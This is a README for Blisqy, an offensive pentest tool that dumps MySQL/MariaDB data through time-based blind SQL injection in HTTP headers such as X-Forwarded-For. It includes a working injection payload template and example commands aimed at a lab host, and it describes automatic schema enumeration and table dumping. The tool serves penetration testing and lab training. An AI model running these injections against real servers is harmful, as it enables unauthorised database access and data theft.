# Blisqy
A slow data siphon for MySQL/MariaDB using bitwise operation on printable ASCII characters, via a blind-SQL injection.

## Usage
```bash
USAGE:
blisqy.py --server <Web Server> --port <port> --header <vulnerable header> --hvalue <header value> 
          --inject <point of injection>  --payload <custom sql payload> --dig <yes/no> --sleeptime <default 0.5>

Options:
  -h, --help            show this help message and exit
  --server=WEBSERVER    Specify host (web server) IP
  --port=PORT           Specify port
  --header=VULNHEADER   Provide a vulnerable HTTP Header
  --hvalue=HEADERVALUE  Specify the value for the vulnerable header
  --inject=INJECTION    Provide where to inject Sqli payload
  --payload=PAYLOAD     Provide SQL statment/query to inject as payload
  --dig=DIGGER          Automatic Mysql-Schema enumeration (takes time!)
  --sleeptime=SLEEP     Sleep-Time for blind-SQLi query (default : 0.5)
  --interactive=INTERACT
                        Turn interactive mode on/off (default : off)
```


# Basics

Blisqy will assit you enumerate a MySQL/Maria DB after finding a Time-Based Blind Sql injection vulnerability on a web server. Currently, it supports injections on HTTP Headers. You should have identified a potential Blind Sql injection vulnerability on a Webserver as demonstrated on [Pentester-Lab (From SQL Injection to Shell II)](https://pentesterlab.com/exercises/from_sqli_to_shell_II/course)

So you can't run Blisqy without :

* `--server` : the vulnerable Webserver
* `--port`  : Which port is the webserver running on?
* `--header` : the identified vulnerable HTTP header
* `--hvalue` : value for the identified vulnerable HTTP header

and most imporntatly `--inject` : what to inject after the `hvalue` (SQLi Payload).



# Options :

## --inject

After identifying a Time-Based BlindSQL injection on a web-server, this option enables the user craft and insert SQL-injection payloads. The value for this option should look like this :

`--inject "' or if((*sql*),sleep(*time*),0) and '1'='1"`

Where 
* `*sql*` - is where SQL Payloads will be inserted and 
* `*time*` - is where Time-Based test will be inserted.

## --sleeptime 
Blisqy now accepts user set --sleeptime and it's inserted on `--inject *time*`. Always make sure you have fine tuned this value to resonates with your environment and network lantency.... Otherwise you'll be toased! (the lower the value, the faster we go).
E.g. 
`--sleeeptime 0.1`

## --payload
This option allows the user run their own custom SQL-injection payloads. Other options like `--dig` and `--interactive` **MUST** not be set (should be ignored) for this option to run.

### Example :

**Command**

```bash
./blisqy.py --server 192.168.56.101 --port 80 --header "X-Forwarded-For" --hvalue "hacker" 
           --sleeptime 0.1 
           --inject "' or if((*sql*),sleep(*time*),0) and '1'='1" 
           --payload "select @@hostname"
```
![Custom Payload](http://i.imgur.com/uB3s7Xk.png)


## --interactive

This option accept two values i.e on or off and it compliments option `--dig` (this option must be set to `yes`). If set as `--interactive on` the user will get to choose which discovered table to enumerate and decide if data from the table should be dumped or not. When set as "--interactive off", every table gets enumerated and all data dumped.

### Getting data from a Table :
The user can decide which columns to extract data from when `--interactive` is set on. The format looks something like this : 
`column1*column1*column2` - just the column names separated by an asterisk. User can also avoid data collection on a particular table by entering `skip` instead of the column names.

### Example :

**Command**

```bash
./blisqy.py --server 192.168.56.101 --port 80 --header "X-Forwarded-For" --hvalue "hacker" --dig yes 
            --sleeptime 0.1 --interactive on --inject "' or if((*sql*),sleep(*time*),0) and '1'='1"
```
![Dig A Specific Table](http://i.imgur.com/HNj8Dwx.png)


## To Do :
* Intergrate an inteligent Fuzzer for hunting SQL injection vulnerabrity(ies) on HTTP Headers and Web Elements
* Support Blind-SQLi enumeration of URLs and WEB Elements apart from HTTP Headers.
